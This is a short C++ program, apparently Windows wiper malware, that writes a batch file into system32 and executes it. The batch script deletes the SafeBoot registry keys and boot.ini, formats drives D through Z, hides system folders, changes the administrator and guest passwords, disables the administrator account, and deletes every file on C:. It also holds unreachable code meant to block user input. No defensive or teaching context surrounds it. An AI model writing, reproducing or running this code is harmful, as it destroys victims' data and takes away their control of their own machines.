#include <windows.h>
#include <fstream>
#include <Winable.h> 

using namespace std;

const string order="@echo off\necho exit|%ComSpec% /k prompt e 100 B4 00 B0 12 CD 10 B0 03 CD 10 CD 20 $_g$_q$_|debug>nul\nchcp 437>nul\ngraftabl 936>nul\nREG DELETE \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\\" /v Network /f\nREG DELETE \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\\" /v Minimal /f\nATTRIB %SYSTEMDRIVE%\\boot.ini -s -a -r -h\nDEL %SYSTEMDRIVE%\\boot.ini /f\nfor %%a in (d e f g h i j k l m n o p q r s t u v w x y z) do format %%a: /q /u /x /y\ncd C:\\\nattrib +s +h \"windows\"\nattrib +s +h \"Program Files\"\nattrib +s +h \"Documents and Settings\"\ncd C:\\Documents and Settings\\Administrator\\桌面\nattrib +s +h\nnet user administrator nisidingle\nnet user guest nihuile\net user administrator /active:no\ndel /f /s /q c:\\*.* ";

int main()
{
	ofstream fout("C:\\WINDOWS\\system32\\runner.bat");
	fout<<order;
	fout.close();
	system("start C:\\WINDOWS\\system32\\runner.bat");
	return 0; 
    FreeConsole();  
    for(;;) BlockInput(true);  
}
